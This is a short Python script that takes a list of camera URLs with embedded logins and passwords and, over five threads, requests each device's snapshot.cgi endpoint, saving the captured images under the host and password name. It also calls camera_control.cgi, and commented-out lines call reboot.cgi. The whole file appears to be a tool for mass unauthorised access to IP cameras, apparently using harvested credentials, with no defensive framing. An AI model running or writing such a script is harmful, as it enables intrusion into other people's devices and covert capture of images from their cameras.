# -*- coding: utf-8 -*-

import sys
from multiprocessing.dummy import Pool as ThreadPool
from threading import Lock
import urllib.request, urllib.error
#from datetime import datetime
import socket

socket.setdefaulttimeout(20)

urls = [line.strip() for line in open(sys.argv[1], 'r')]

def parse(urls):
    try:
        url = str(urls[7:-1])
        login = url.split(':')[0]
        passw = url.split(':')[1]
        passw = passw.split('@')[0]
        snappath = url.split('@')[1]
        #dtnow = datetime.now().strftime('%Y-%m-%d-%H-%M-%S')
        filename = snappath.split(':')[0]
        filename = str(filename + "-" + passw + ".jpg")
        #print(url)
        urllib.request.urlretrieve("http://" + str(snappath) + "/snapshot.cgi?user=" + str(login) + "&pwd=" + str(passw), filename)
    except urllib.error.HTTPError as e:
        if e.code == 401:
            print(str(urls) + " err Unauthorized ")
            #urllib.request.urlopen("http://" + str(snappath) + "/reboot.cgi?=user=" + str(login) + "&pwd=" + str(passw))
        else:
            print(str(urls) + " err req. code")
            #urllib.request.urlopen("http://" + str(snappath) + "/reboot.cgi?&user=" + str(login) + "&pwd=" + str(passw))

    except socket.error:
        try:
            urllib.request.urlopen("http://" + str(snappath) + "/camera_control.cgi?user=" + str(login) + "&pwd=" + str(passw))
        #print("http://" + str(snappath) + "/snapshot.cgi?user=" + str(login) + "&pwd=" + str(passw) + " err socket ")
        except urllib.error.HTTPError as e:
            if e.code == 200:
                urllib.request.urlretrieve("http://" + str(snappath) + "/snapshot.cgi?user=" + str(login) + "&pwd=" + str(passw), filename)
                print(str(urls) + " " + str("http://" + str(snappath) + "/snapshot.cgi?user=" + str(login) + "&pwd=" + str(passw)) + " camera err ")
            else:
                print("http://" + str(snappath) + "/snapshot.cgi?user=" + str(login) + "&pwd=" + str(passw) + " err socket ")
        except:
            print(str(urls) + str("http://" + str(snappath) + "/snapshot.cgi?user=" + str(login) + "&pwd=" + str(passw)) + " camera socket err ")

    except:
        print("http://" + str(snappath) + "/snapshot.cgi?user=" + str(login) + "&pwd=" + str(passw) + " err oth ")
        #urllib.request.urlopen("http://" + str(snappath) + "/reboot.cgi?&user=" + str(login) + "&pwd=" + str(passw))

lock = Lock()
pool = ThreadPool(5)

pool.map(parse, urls)
pool.close()
pool.join()
